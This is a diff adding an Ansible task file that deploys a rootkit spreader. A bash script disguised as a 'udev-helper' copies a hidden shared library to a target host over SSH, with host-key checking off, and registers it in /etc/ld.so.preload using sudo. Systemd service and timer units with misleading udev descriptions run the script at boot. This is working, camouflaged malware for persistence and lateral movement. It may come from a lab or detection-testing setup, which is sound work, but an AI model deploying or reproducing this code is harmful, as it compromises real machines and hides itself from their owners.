@@ -1,0 +1,86 @@
+---
+- name: Install SSH client
+  apt:
+    name: openssh-client
+    state: present
+    update_cache: yes
+
+- name: Create hidden rootkit spread script
+  copy:
+    dest: "{{ spread_script }}"
+    owner: root
+    group: root
+    mode: "0750"
+    content: |
+      #!/bin/bash
+      # udev-helper — device event synchronization
+
+      TARGET="{{ target_host }}"
+      TARGET_USER="{{ target_user }}"
+      LIB="{{ rootkit_lib }}"
+      PRELOAD="/etc/ld.so.preload"
+      LOG="{{ spread_log }}"
+      SSH_OPTS="-o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=10"
+
+      echo "[$(date -Is)] Initiating spread to $TARGET" >> "$LOG"
+
+      if ! ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" "true" 2>/dev/null; then
+          echo "[$(date -Is)] SSH connection to $TARGET failed" >> "$LOG"
+          exit 1
+      fi
+
+      if ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" "test -f $LIB" 2>/dev/null; then
+          echo "[$(date -Is)] Already present on $TARGET" >> "$LOG"
+          exit 0
+      fi
+
+      scp $SSH_OPTS "$LIB" "${TARGET_USER}@${TARGET}:/tmp/.libsys.so" 2>/dev/null
+      ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" \
+          "sudo mv /tmp/.libsys.so $LIB && sudo chmod 755 $LIB && sudo sh -c 'echo $LIB > $PRELOAD'" \
+          2>/dev/null
+
+      echo "[$(date -Is)] Spread complete on $TARGET" >> "$LOG"
+
+- name: Create systemd service for spreader
+  copy:
+    dest: "/etc/systemd/system/{{ spread_service }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=udev device event helper
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      User={{ username }}
+      ExecStart={{ spread_script }}
+      RemainAfterExit=yes
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create systemd timer for spreader
+  copy:
+    dest: "/etc/systemd/system/{{ spread_timer }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Run udev event helper
+
+      [Timer]
+      OnBootSec=4min
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start spreader timer
+  systemd:
+    name: "{{ spread_timer }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
